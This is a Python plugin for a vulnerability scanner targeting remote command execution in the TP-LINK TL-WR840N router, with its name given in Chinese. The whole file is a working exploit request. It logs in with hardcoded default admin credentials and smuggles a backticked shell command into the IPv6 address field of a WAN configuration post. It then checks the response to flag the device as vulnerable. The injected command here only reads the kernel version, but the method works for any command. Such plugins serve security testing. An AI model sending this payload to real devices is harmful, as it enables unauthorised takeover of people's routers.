# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "TP-LINK TL-WR840N 远程命令执行漏洞",
        "description": "",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='post',
            path='./cgi?2&2&2',
            timeout=15,
            headers={
                "Content-Type": "text/plain",
                "Referer": f"{self.target.url}/mainFrame.htm",
                "Origin": f"{self.target.url}",
                "Cookie": "Authorization=Basic YWRtaW46YWRtaW4="
            },
            data="""[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,2
X_TP_lastUsedIntf=ipoe_eth3_s
X_TP_lastUsedName=ewan_ipoe_s
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,18
externalIPAddress=172.26.26.2
subnetMask=255.255.255.0
defaultGateway=172.26.26.1
NATEnabled=1
X_TP_FullconeNATEnabled=0
X_TP_FirewallEnabled=1
maxMTUSize=1500
DNSOverrideAllowed=1
DNSServers=1.1.1.1,8.8.8.8
X_TP_IPv4Enabled=0
X_TP_IPv6Enabled=1
X_TP_IPv6AddressingType=Static
X_TP_ExternalIPv6Address=`cat /proc/version > /var/tmp/ver`
X_TP_PrefixLength=128
X_TP_DefaultIPv6Gateway=::
X_TP_IPv6DNSOverrideAllowed=1
X_TP_IPv6DNSServers=::,::
enable=1"""
        )
        if '[error]0' in r.text:
            return {"LoopholeInfo": self.__info__}
